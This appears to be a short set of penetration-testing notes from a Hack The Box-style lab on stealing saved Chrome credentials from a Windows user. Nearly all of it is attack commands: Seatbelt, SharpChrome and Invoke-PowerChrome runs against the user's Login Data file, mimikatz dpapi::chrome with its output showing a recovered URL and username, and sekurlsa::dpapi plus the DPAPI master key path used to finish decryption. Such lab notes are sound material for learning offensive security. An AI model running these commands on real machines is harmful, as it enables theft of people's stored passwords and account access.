
```
./Seatbelt.exe FirefoxHistory ChromiumHistory DNSCache
```

Try this tool aswell, it's broken!

```
SharpChrome.exe logins /target:"C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data" /format:table /showall
```

PowerShell

```
Invoke-PowerChrome -Browser Chrome
```
## Best Methodology 

If Chrome is installed:
##### mimikatz

```
mimikatz # dpapi::chrome /in:"C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data"

URL     : https://zephyr.atlassian.htb/ ( https://zephyr.atlassian.htb/ )
Username: melissa
ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption
```

The error "No Alg and/or Key handle despite AES encryption" means Mimikatz can't decrypt the Chrome credentials because it needs the user's DPAPI master key. Here's what you need to enumerate and how:

1. **DPAPI Master Key**

The master key is stored in:

```
C:\Users\marcus\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}
```

But we'll use mimikatz

Navigate to user marcus and iterate through all GUID & MasterKey's. Usually it's the last one.

```
sekurlsa::dpapi
```
